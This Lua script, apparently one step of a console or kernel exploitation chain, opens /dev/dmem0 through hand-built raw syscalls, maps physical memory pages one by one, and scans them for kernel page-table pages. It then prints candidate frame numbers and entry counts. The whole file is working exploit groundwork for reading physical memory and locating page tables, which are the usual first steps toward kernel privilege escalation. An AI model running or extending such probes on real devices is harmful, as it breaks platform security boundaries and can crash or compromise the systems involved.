-- CRASH_CLASS: HIGH
-- PROBE 808b: find page-table pages in low physical memory by their kernel-half entries
--
-- A PML4 has nothing at entry 0 on this kernel but entries 256..511 cover the kernel half of
-- the address space, so the earlier "first qword non-zero" scan was blind to it.  This probe
-- samples offsets 0x800, 0xBF8, 0xFF8 and 0x0 of every 4 KiB page in [0x1000000,0x2000000) and
-- then counts present entries in each page that looks like a table, printing sample PFNs.
print("=== PROBE 808b: PAGE TABLE FINDER ===")
print("")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function rdq(a)
    local lo, hi = rd(a), rd(a + 4)
    if lo == nil or hi == nil then return nil end
    return hi * 4294967296 + lo
end
local function u64(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_open = make_syscall(5)
pcall(function() return getpid() end)
local s = "/dev/dmem0"
local cpath = memory.alloc(32)
for i = 1, #s do pcall(function() memory.write_byte(cpath + i - 1, s:byte(i)) end) end
pcall(function() memory.write_byte(cpath + #s, 0) end)
local fd = to_num(select(2, pcall(function() return sc_open(uint64(cpath), uint64(2), uint64(0)) end)))
print("[0] fd=" .. fd)
local VA = 0x880000000
local function map_page(phys)
    pcall(function() return sc_munmap(uint64(VA), uint64(0x4000)) end)
    local ok, r = pcall(function()
        return sc_mmap(uint64(VA), uint64(0x4000), uint64(0x33), uint64(0x11),
            uint64(fd), u64(math.floor(phys / 4294967296), phys % 4294967296))
    end)
    if not ok then return false end
    return to_num(r) == VA
end
local function unmap() pcall(function() return sc_munmap(uint64(VA), uint64(0x4000)) end) end
local function present(v) return v ~= nil and (v % 2) == 1 and math.floor(v / 4096) % 1048576 ~= 0 end

print("")
print("[1] scanning [0x1000000,0x2000000) for kernel-half entries")
local cands = {}
local p = 0x1000000
while p < 0x2000000 do
    if map_page(p) then
        local e0 = rdq(VA)
        local e8 = rdq(VA + 0x800)
        local eb = rdq(VA + 0xBF8)
        local ef = rdq(VA + 0xFF8)
        local n = 0
        if present(e0) then n = n + 1 end
        if present(e8) then n = n + 1 end
        if present(eb) then n = n + 1 end
        if present(ef) then n = n + 1 end
        if n >= 2 then
            cands[#cands + 1] = {p, n, e0 or 0, e8 or 0, eb or 0, ef or 0}
        end
        unmap()
    end
    p = p + 0x1000
end
print("  candidates: " .. #cands)
for i = 1, math.min(#cands, 12) do
    local c = cands[i]
    print(string.format("   %08X n=%d [0]=%016X [800]=%016X [BF8]=%016X [FF8]=%016X",
        c[1], c[2], c[3], c[4], c[5], c[6]))
end
print("")
print("[2] present-entry counts for the first candidates")
for i = 1, math.min(#cands, 6) do
    local phys = cands[i][1]
    if map_page(phys) then
        local n = 0
        local samples = {}
        for k = 0, 511 do
            local v = rdq(VA + k * 8)
            if present(v) then
                n = n + 1
                if #samples < 4 and (v % 2) == 1 then
                    samples[#samples + 1] = string.format("[%d]=%X", k, math.floor(v / 4096) * 4096)
                end
            end
        end
        print(string.format("   %08X present=%d %s", phys, n, table.concat(samples, " ")))
        unmap()
    end
end
print("")
print("[3] alive pid=" .. to_num(getpid()))
